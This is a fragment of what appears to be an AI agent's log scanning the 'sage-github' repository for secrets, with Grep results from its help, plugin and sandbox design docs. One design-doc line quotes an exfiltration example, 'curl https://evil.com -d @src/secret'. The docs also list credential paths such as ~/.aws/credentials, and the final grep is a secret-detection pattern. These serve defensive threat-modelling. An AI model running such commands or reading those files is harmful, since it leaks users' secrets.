on_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":1}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"age-github -\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":1}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"maxdepth 3\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":1}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\" -\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":1}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"type f | head\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":1}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\" -10\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":1}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"0\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":1}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"\\\\\\\"\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":1}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"}\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":1}\\n\\nevent:content_block_stop\\ndata:{\\\"type\\\":\\\"content_block_stop\\\",\\\"index\\\":1}\\n\\nevent:content_block_start\\ndata:{\\\"type\\\":\\\"content_block_start\\\",\\\"content_block\\\":{\\\"name\\\":\\\"Grep\\\",\\\"input\\\":{},\\\"id\\\":\\\"toolu_9141a50070aa487e9d897854\\\",\\\"type\\\":\\\"tool_use\\\"},\\\"index\\\":2}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":2}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"{\\\\\\\"path\\\\\\\": \\\\\\\"/Users/al\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":2}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"acner/sandbox\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":2}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"/sage-github\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":2}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"\\\\\\\"\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":2}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\", \\\\\\\"pattern\\\\\\\": \\\\\\\"(api\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":2}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"[_-]?key\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":2}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"|\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":2}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"secret|password|\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":2}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"token|credential\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":2}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"|access_key|\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":2}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"private_key|\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":2}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"auth)\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":2}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"\\\\\\\"\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":2}\\n\\nevent:content_block_delta\\ndata:{\\\"delta\\\":{\\\"partial_json\\\":\\\"}\\\",\\\"type\\\":\\\"input_json_delta\\\"},\\\"type\\\":\\\"content_block_delta\\\",\\\"index\\\":2}\\n\\nevent:content_block_stop\\ndata:{\\\"type\\\":\\\"content_block_stop\\\",\\\"index\\\":2}\\n\\nevent:message_delta\\ndata:{\\\"delta\\\":{\\\"stop_reason\\\":\\\"tool_use\\\"},\\\"type\\\":\\\"message_delta\\\",\\\"usage\\\":{\\\"output_tokens\\\":152,\\\"cache_creation_input_tokens\\\":0,\\\"input_tokens\\\":7489,\\\"cache_read_input_tokens\\\":0}}\\n\\nevent:message_stop\\ndata:{\\\"type\\\":\\\"message_stop\\\"}\\n\\n\"}}\nREADME.md:111:- 没有 token 计数 / 计费展示。\ndocs/BUILTIN_DEPENDENCIES.md:24:外置插件必须在 manifest 中声明服务依赖和权限，并经安装授权后调用。宿主新增能力时通过插件 SDK 的 host service 或受控扩展点开放，同时验证权限、数据边界及返回值。Snippets 与 MFA 的专用记录格式、查找、TOTP 计算和安全填充逻辑都属于外置插件；宿主只提供与插件无关的 secret 类型配置存储、加密和遮盖能力。\ndocs/CODEX_CLI.md:44:- 请求监控记录文本与 token 用量。CLI 未提供实际账单金额，界面的通用估算不等于 Codex 账单；实际额度和计费以 Codex 账号为准。\ndocs/CODEX_CLI.md:48:`node scripts/test-codex-bridge.cjs` 使用本地协议夹具验证流式输出去重、图片、续接、token 统计、取消、进程退出、授权拦截及重复工具调用只执行一次。附加 `--local` 会使用本机 ChatGPT 应用内的 Codex，在临时 HOME 中验证真实 app-server 握手与动态工具注册，不读取现有登录凭据，也不发送模型请求。\ndocs/CODEX_CLI.md:56:明确的线程不存在错误可用 Sage 历史恢复；连接中断或模型执行失败不自动重跑。取消先发 turn/interrupt，最多等待 750ms 后关闭进程组；屏蔽异步审批/工具的迟到回调，拒绝其他线程/轮次的事件及重复工具副作用。多次 token 通知按累计差值计量，避免重复计数。\ndocs/EXTENSION_COOKBOOK.md:57:Git 自己在 `shared/plugins/git-colors.ts` 定义分组与 27 个 token，\ndocs/HELP.en.md:28:The new setup guide starts by asking how you want to connect. Sage requires a direct API connection or an installed, enabled and configured CLI engine plugin. A relay supplies authorized models through the API engine. The guide never fills credentials, submits token applications or sends chat messages for you.\ndocs/HELP.en.md:32:2. Answer whether you have a token. Paste an existing token, or click Apply beside the Token field, apply on the relay website, and return with your token. Apply appears only when the application page is reachable and Token is empty; otherwise check the address or contact the operator.\ndocs/HELP.en.md:34:4. In model settings, wait for the relay provider and authorized models to appear automatically. Initial synchronization can take a little while. Connected does not mean synchronized. If no models appear, check the token’s model permissions instead of adding a duplicate relay provider.\ndocs/HELP.en.md:41:4. An empty list differs from a failed connection. For an empty list, check account model permissions or enter IDs manually. For authentication or network errors, correct the configuration and retry; failure is not successful setup.\ndocs/HELP.en.md:50:Choose Use a CLI plugin to install an engine from the plugin marketplace and enable it globally. Follow its instructions to install the CLI and sign in or configure its API. Confirm CLI detection and authentication, then select the engine in General. The plugin manages its models and credentials; API global models are not required for this route. Explore on my own closes the guide.\ndocs/HELP.en.md:197:This catalogue follows Sage's API conversation toolchain. CLI availability depends on the engine bridge. Sending still applies file, network, plugin and approval checks. Selecting a capability does not authorize every future action.\ndocs/HELP.en.md:210:- Conservative: cap ~160k tokens, keeps the last 5 turns. Best for large-window models and long discussions needing full recall; costs bigger, pricier, slower requests.\ndocs/HELP.en.md:211:- Balanced: cap ~120k tokens, keeps the last 3 turns. The everyday sweet spot (fallback when unset).\ndocs/HELP.en.md:212:- Aggressive: cap ~80k tokens, keeps the last 2 turns. For very long conversations or small-window / low-budget models; loses early detail sooner.\ndocs/HELP.en.md:214:Explicit limits win: if a fixed window (e.g. 200K tokens) is set in the conversation context panel or settings, that value takes precedence; the mode only affects kept turns and trigger timing.\ndocs/HELP.en.md:221:- Simple Truncation (fast): keeps only the head snippet. Fastest and spends no model tokens; loses the semantics of the truncated part.\ndocs/HELP.en.md:222:- LLM Smart Summary (more accurate): always condenses evicted content with the model. Best semantic retention; spends extra tokens and time on every compaction.\ndocs/HELP.en.md:228:- Small model / save tokens / want speed: Aggressive + Simple Truncation.\ndocs/HELP.en.md:233:Both the context panel (grid icon in the composer) and Settings → Context Window open \"Compaction Records\", listing each compaction's trigger (automatic/manual), mode, summary strategy and before/after token counts, so you can judge whether the current configuration fits.\ndocs/HELP.en.md:244:Add Anthropic or OpenAI-compatible providers with an endpoint, credentials and models.\ndocs/HELP.en.md:264:Inspect status, model, stage and error in the request monitor. For 401/403 check credentials and permissions; for 429 check quota/rate limits; for timeouts check connectivity and service health. Do not paste API keys into public help requests. CLI login and API provider credentials are separate configurations.\ndocs/HELP.en.md:314:Check project and directory filters. Hiding a directory affects display and search, not deletion or model authorization. Reads outside the project remain subject to the security policy.\ndocs/HELP.en.md:540:## Settings and secrets\ndocs/HELP.en.md:541:Use sdk.settings.get/set for declared settings. Scope precedence matches the client. Secrets support global scope only. Do not hardcode credentials in manifests, skills, HTML or logs. Routing extensions return provider/model references, not API keys.\ndocs/HELP.en.md:544:Cover valid input, missing/extra fields, oversized values, wrong types, missing permissions, disabled dependencies, service exceptions and reactivation. Verify real writes/sends only against authorized test destinations.\ndocs/HELP.en.md:567:These are identifiers only: no message bodies, attachments, credentials or task configuration, and no permission bypass. A view entry opens its declared page without automatically injecting this context into the iframe. Use service/method for context-aware actions.\ndocs/HELP.en.md:599:| Receive host notifications | events | Bounded notification, not new authorization |\ndocs/HELP.en.md:668:## Instructions are not authorization\ndocs/HELP.en.md:669:Skills do not automatically expand file, network or plugin permissions. Required services must still be configured. Store credentials in secret settings, not Markdown. Refresh the catalogue after changes and send a clear new request.\ndocs/HELP.en.md:700:Enter secret values under “Encrypted MCP environment variables” on the server list page. Values are encrypted in local settings; the renderer only receives variable names and protected placeholders. Secrets are used for MCP requests only and are not injected into terminals or other child processes. The HTTP Bearer field references a variable by name.\ndocs/HELP.en.md:703:STDIO requires a command, arguments, environment variables and working directory. HTTP requires a URL, bearer-token env var name and headers. JSON import adds servers in bulk (imported as disabled). Names must be unique.\ndocs/HELP.en.md:712:Each server can be enabled or disabled independently. Export produces a secret-free JSON template for sharing configuration.\ndocs/HELP.en.md:715:Imported servers start disabled and must be enabled manually. MCP template exports omit secret environment values; encrypted settings backups protect them. Full contracts are documented in the SDK EXTENSIBILITY.md.\ndocs/HELP.en.md:720:2. For HTTP use the actual MCP endpoint, not a website URL. The token field names an environment variable; do not put secrets in descriptions.\ndocs/HELP.en.md:731:Execution failure: discovery success does not validate every argument or permission. Read the tool result. MCP output is data, not additional user authorization.\ndocs/HELP.en.md:786:5. A failed commit retains the message and shows an error. Check conflicts, author identity and hooks before retrying.\ndocs/HELP.en.md:825:Check the remote URL, connectivity, SSH agent or credential helper. Sage does not wait for a password in an invisible terminal; configure authentication in the terminal and retry.\ndocs/HELP.en.md:840:For missing author identity, configure user.name and user.email for this repository in the terminal. Fix failed hooks from their output; Sage does not bypass hooks. Empty messages are rejected and unstaged files are not automatically committed.\ndocs/HELP.en.md:843:In the matching repository terminal inspect git status, git branch -vv, git remote -v and git log --oneline --decorate -10. Do not publish credential-bearing output.\ndocs/HELP.en.md:929:2. Review name, instructions, schedule, model, timeout, authorization and destinations.\ndocs/HELP.en.md:930:3. A linked conversation can supply inherited authorization; turn inheritance off to select an independent policy.\ndocs/HELP.en.md:943:Run details distinguish execution failure, pending approval, timeout and delivery failure. Work beyond existing authorization still waits for a human decision and is bounded by task timeout. Successful execution with failed channel delivery is a different outcome; inspect delivery details before rerunning the work.\ndocs/HELP.en.md:946:- Scheduled authorization inheritance\ndocs/HELP.en.md:950:<a id=\"scheduled-authorization\"></a>\ndocs/HELP.en.md:952:# Scheduled authorization inheritance\ndocs/HELP.en.md:962:Approving a Bash command for one destination does not authorize another command, port or extra target. Plugin methods and arguments and MCP tool aliases also participate in matching. New calls are evaluated under the inherited policy and may require human approval.\ndocs/HELP.en.md:965:Each run checks the source conversation, project and policy. A missing or archived source, a project mismatch or changes to policy contents, active plugin code/permissions/settings, or MCP destinations/environment invalidate the snapshot. Review the source policy, edit the task and save to explicitly capture authorization again. Pausing or re-enabling alone never widens authorization.\ndocs/HELP.en.md:971:Disable inheritance to choose the task's own policy. Plugin-created tasks and manual tasks without a source cannot invent inherited permission. Exported templates exclude reusable authorization snapshots; imports require policy and destination review.\ndocs/HELP.en.md:983:Enter platform credentials, recipient and callback information, then enable and test the channel. Inbound messages can trigger conversations and responses can be forwarded according to channel settings.\ndocs/HELP.en.md:986:Check permissions, subscribed events, recipients and credentials. External messages do not automatically expand project security permissions.\ndocs/HELP.en.md:1007:Check application credentials, event subscriptions and recipients. Long connections require the app to run with network access. Card updates remain subject to Feishu permissions, API limits and latency.\ndocs/HELP.en.md:1020:Follow the sage-website deployment guide for addresses, tokens and callbacks. Uploading an installer does not update relay code; server code changes require deployment and restart.\ndocs/HELP.en.md:1022:## Requesting a token\ndocs/HELP.en.md:1023:Settings → Relay: while the Token field is empty and the relay site exposes an application page (connection address + /apply), an Apply button appears next to the field and opens that page in your browser. Submit the request there; once an administrator approves it, collect the token with the query key shown on the page. The button hides once a token is filled in, and stays hidden when the page is unreachable — ask an administrator to issue a token directly.\ndocs/HELP.en.md:1040:Verify the desktop service, relay address and token. Check connection status when the desktop is offline, networking changes or tokens expire. Remote access does not mean desktop work continues after app exit.\ndocs/HELP.en.md:1162:Manage policies under Security and authorization and select one beside the composer.\ndocs/HELP.en.md:1179:One-time approval applies to the current request. Reusable approval matches the tool and arguments. Conversation grants remain subject to deterministic denials and runtime sandboxing. Scheduled inheritance uses a separate snapshot; see Scheduled authorization inheritance.\ndocs/HELP.en.md:1237:| Increased tokens/cost | History, images, tool output and compression | Context window and compression |\ndocs/HELP.en.md:1245:| Pull/Push rejected | Upstream, divergence, authentication, local changes | Git troubleshooting |\ndocs/HELP.en.md:1254:Confirm the version in Help. Copy the error and inspect request monitoring, plugin logs, decision history or task runs as relevant. Inspect screenshots for credentials/private content. Back up before destructive recovery; deleting the entire data directory is not a routine fix.\ndocs/HELP.en.md:1322:Use the offered encryption, password and module-selection options. Restoring on another host may require a password or entering credentials again.\ndocs/HELP.en.md:1366:Settings → Appearance → Date & time configures the timezone (system or IANA), date format presets and custom patterns. Smart dates show time-only for today, a label for yesterday and omit the year for the current year. Format tokens include YYYY, MM, DD, HH, mm, ss. A live preview is shown below.\ndocs/HELP.en.md:1410:## First authorization\ndocs/HELP.en.md:1493:Hold to talk defaults to Fn, manual dictation to Fn + Control, and capture to Cmd + Shift + A. All are Sage-window shortcuts. Recording a new binding intercepts keys instead of invoking existing actions; Escape cancels recording. Releasing or blurring ends a held recording, including cancellation while system authorization is pending.\ndocs/HELP.zh-CN.md:210:- 保守：上限约 160k tokens，保留最近 5 轮。适合大窗口模型、需要完整回溯的长讨论；代价是请求更大、更费 token、更慢。\ndocs/HELP.zh-CN.md:211:- 均衡：上限约 120k tokens，保留最近 3 轮。大多数日常对话的平衡点（未选择时的缺省档）。\ndocs/HELP.zh-CN.md:212:- 激进：上限约 80k tokens，保留最近 2 轮。适合超长对话、小窗口或低预算模型；代价是较早丢失早期细节。\ndocs/HELP.zh-CN.md:214:显式限制优先：若在对话的上下文面板或设置中指定了固定窗口（如 200K tokens），以显式值为准，模式只影响保留轮数与触发时机。\ndocs/HELP.zh-CN.md:221:- 简单截断（快速）：只保留开头片段。速度最快、不消耗模型 token；代价是丢失被截部分的语义。\ndocs/HELP.zh-CN.md:222:- LLM 智能摘要（更准确）：每次都调用模型浓缩被驱逐内容。语义保留最好；代价是每次整理都额外消耗 token 与时间。\ndocs/HELP.zh-CN.md:228:- 小模型 / 省 token / 要快：压缩模式「激进」+ 摘要「简单截断」。\ndocs/HELP.zh-CN.md:233:上下文面板（输入区九宫格图标）与 设置 → 上下文窗口 都可打开「整理记录」，记录每次整理的触发方式（自动/手动）、压缩模式、摘要策略、整理前后 token 数，便于评估当前配置是否合适。\ndocs/HELP.zh-CN.md:541:使用 sdk.settings.get/set 读写声明的配置；project、global、both 的覆盖规则与客户端一致。secret 仅支持 global。不要把密钥硬编码到清单、技能、HTML 或日志中。模型路由扩展返回提供商/模型引用，不返回 API Key。\ndocs/HELP.zh-CN.md:950:<a id=\"scheduled-authorization\"></a>\ndocs/PLUGIN_EXTENSION_CATALOG.md:42:| `PostCompact` | 压缩结束通知 | `trigger, compacted_messages, after_estimated_tokens`；manual/automatic | 当前调用点只通知，不消费返回决策 |\ndocs/PLUGIN_MANUAL.en.md:11:1. Choose an optional plugin or import a `.sageplugin` file. Review versions, dependencies, permissions and digests before confirming. A checksum detects corruption; it does not authenticate the publisher.\ndocs/PLUGIN_MANUAL.en.md:30:Installing a package does not run npm scripts or require a separate Node installation. Exported packages contain code and declared resources, not user configuration, credentials, cookies or audit logs. Code is not encrypted: never embed secrets.\ndocs/PLUGIN_MANUAL.en.md:185:channels.send takes `{id,text}` and actually sends through a configured project channel. Obtain user authorization before sending. Call metadata excludes argument/result bodies, but plugin views and website logs may still expose business content.\ndocs/PLUGIN_MANUAL.en.md:249:Declared fields support string, number, boolean and global-only secret values. Secret values are encrypted in host settings and omitted from renderer settings; a plugin's own service can read them through `sdk.settings.get`, so configure secrets only for trusted plugin code. sdk.settings.get/set checks declared fields and types and isolates namespaces by plugin ID.\ndocs/PLUGIN_MANUAL.en.md:251:Global fields belong to the application's Other backup group and follow import overwrite/ignore rules. Project fields are stored independently and are not exported in packages. There is no secret field type: keep model credentials in the host rather than plain string settings.\ndocs/PLUGIN_MANUAL.en.md:278:Direct API is the only built-in engine. Install a Claude Code, Codex or custom adapter in Global Plugins, enable it and select it in General → Backend. The CLI owns installation and authentication. There is no automatic CLI discovery/fallback or old configuration migration. Disabling, uninstalling or replacing an engine cancels its active requests.\ndocs/PLUGIN_MANUAL.en.md:318:- Return {text,sessionId?,usage?,error?}; usage includes token counts, cache token counts and costUsd.\ndocs/PLUGIN_MANUAL.md:611:- 配置支持 string、number、boolean 和全局范围的 secret 类型。secret 在宿主设置文件中加密保存，设置管理界面只显示遮盖标记；插件自己的服务可以通过 `sdk.settings.get` 读取明文，因此只给可信插件配置密钥。宿主能力请先 capabilities.list，再核对参数契约。\ndocs/PLUGIN_PLATFORM_DESIGN.md:63:建议能力空间：workspace、files、models、conversations、tasks、ui、settings、secrets、events、services、tools。SDK 对象只是客户端代理，状态以宿主为准。\ndocs/SANDBOX_DESIGN.md:20:访问整个用户主目录下的所有数据——包括 `~/.ssh/id_rsa`、`~/.aws/credentials`、\ndocs/SANDBOX_DESIGN.md:43:| 密钥泄漏 | AI 读取 `~/.aws/credentials`、`~/.config/*` | ❌ 无防护 | §4.3 fs 强约束 |\ndocs/SANDBOX_DESIGN.md:255:和所有密钥存储路径（.env、.npmrc 里的 token、.netrc、.ssh、cloud credential sockets）。\ndocs/SANDBOX_DESIGN.md:304:  // 包管理器配置（npm/yarn/pip 的 token）\ndocs/SANDBOX_DESIGN.md:384:解析 Bash 命令里的所有绝对路径 token，任一路径落在项目外且非只读系统前缀 →\ndocs/SANDBOX_DESIGN.md:394:  const tokens = extractPathTokens(cmd);\ndocs/SANDBOX_DESIGN.md:395:  for (const t of tokens) {\ndocs/SANDBOX_DESIGN.md:472:单纯域名白名单**拦不住 HTTPS 数据外传**——`curl https://evil.com -d @src/secret`\ndocs/SANDBOX_DESIGN.md:490:### 4.5 密钥加密存储 (`sandbox/secrets.ts`)\ndocs/SANDBOX_DESIGN.md:500:// sandbox/secrets.ts\ndocs/SANDBOX_DESIGN.md:599:通过 Bash 间接 `source` 一个脚本，脚本里再跑越权命令。`bash-policy` 的 token\ndocs/SANDBOX_DESIGN.md:683:| **P2** | 密钥加密存储 + 审计日志 + UI | 新建 `sandbox/secrets.ts`、`sandbox/audit-log.ts`；改 `main.ts` 的 read/writeSettings；新增审计 UI 组件 | ~1.5 天 | settings.json 无明文 key；`audit.log` 有 AI 操作记录 |\n\n[capped at 100 results]"
        },
        {
          "id": "toolu_78f370756a074edea11b0d38",
          "name": "Grep",
          "input": {
            "path": "/Users/alacner/sandbox/sage-github",
            "pattern": "(sk-|ghp_|gho_|github_pat|AKIA|[A-Za-z0-9]{32,}|-----BEGIN (RSA |EC )?PRIVATE KEY)"
          },
